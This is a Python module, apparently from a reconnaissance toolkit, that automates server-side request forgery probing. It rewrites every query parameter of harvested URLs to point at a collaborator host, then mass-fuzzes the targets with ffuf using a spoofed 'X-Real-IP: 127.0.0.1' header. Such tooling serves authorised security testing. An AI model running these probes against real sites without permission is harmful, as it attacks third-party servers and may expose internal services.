import config
import utils
from log import logger
from furl import furl

# partly legacy code


def runFfufSsrf(urls_file:str):
    cmd = f"{config.ffuf_command} -w {urls_file}   -u FUZZ  -H \"X-Real-IP: 127.0.0.1\" -r -mc 200,301,302,307 -fs 0 -fw 1 -t 100 -s "
    logger.log('info',f'Running ssrf urls fuzzing with fuff with command {cmd}')
    utils.invokeCommand(cmd)
    logger.log('info',f'ssrf fuzzing finished')


# def process_oneparam_copy(copy, param, collaborator):
#     marker = copy.host + str(copy.path) + param
#     # print('Inseted marker:             '+marker)
#     value = collaborator + marker
#     copy.args[param] = value
#     # print('New Copy:           {}'.format(copy))
#     # print('\n\n\n')
#     return copy


def process_allparam_copy(copy,collaborator):
    params = copy.args
    string = '/'.join(params.keys())

    marker = copy.host + str(copy.path) + string
    # print('Inseted marker:             '+marker)
    value = collaborator + marker
    for param in params.keys():
        copy.args[param] = value
    # print('New Copy:           {}'.format(copy))
    # print('\n\n\n')
    return copy


def process_url(url,collaborator):

    f = furl(url)

    new_furl = process_allparam_copy(f.copy(), collaborator)
    return new_furl
    # else:
    #     params = f.args
    #     # params omdict1D([('one', '1'), ('two', '2')])
    #     for param in params.keys():
    #         # params.key()[1, 2, 3]
    #
    #         # print('Original url:          ')
    #         # print(f)
    #         new_furl = process_oneparam_copy(f.copy(), param,collaborator)
    #         print(new_furl)


def ssrfWrapper():
    urls = utils.readFile(config.waybackurls_withquery_live_file)
    processed_urls = set()
    for url in urls:
        processed_urls.add(process_url(url,config.collaborator))

    utils.writeFile(processed_urls,config.ssrf_urls_file)

    runFfufSsrf(config.ssrf_urls_file)



